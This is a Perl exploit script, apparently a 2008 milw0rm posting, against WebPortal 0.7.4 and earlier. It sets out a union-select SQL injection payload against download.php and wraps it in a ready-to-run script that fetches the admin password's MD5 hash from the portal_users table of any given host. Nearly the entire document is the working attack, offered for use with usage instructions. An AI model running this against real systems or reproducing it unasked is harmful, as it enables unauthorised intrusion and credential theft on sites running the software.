#!/usr/bin/perl
# --==+============================================================================+==--
# --==+            WebPortal <= 0.7.4 Remote SQL Injection Exploit                 +==--    
# --==+============================================================================+==--
# 
#  [*] Discovered By: StAkeR ~ StAkeR@hotmail.it
#  [+] Discovered On: 12 Sep 2008
#  [+] Download: http://webportal.ivanoculmine.com/download.php?mid=14
#  
#  [*] SQL Injection
#  [+] download.php?aid=1'+union+select+pass,0,0,0,0+from+portal_users+where+id='1
#  [+] get file "download.php" and you can read 
#  
#  [*] Exploit:
#  
 # ----------------------------------------------------------
 # WebPortal <= 0.7.4 Remote SQL Injection Exploit 
 # Author: StAkeR - StAkeR[at]hotmail[dot]it
 # ----------------------------------------------------------
 # Usage: perl http://localhost/cms 
 # ----------------------------------------------------------

 use strict;
 use LWP::Simple;


 my $domain = shift @ARGV or banner();
 my $injsql = "/download.php?aid=1'+union+select+pass,0,0,0,0+from+portal_users+where+id='1";

 if(get($domain.$injsql) =~ /([0-9a-f]{32})/)
 {
   print "[+] Exploit Succesfull!\n";
   print "[+] MD5 Password: ${1}\n";
 }
 else
 {
   print "[!] Exploit Failed!\n";
   print "[!] Site Not Vulnerable!\n";
 }

 sub banner
 {
   print "[+] WebPortal <= 0.7.4 Remote SQL Injection Exploit\n";
   print "[+] Usage: ${0} http://[host]\n";
   return exit;
 }

# milw0rm.com [2008-09-12]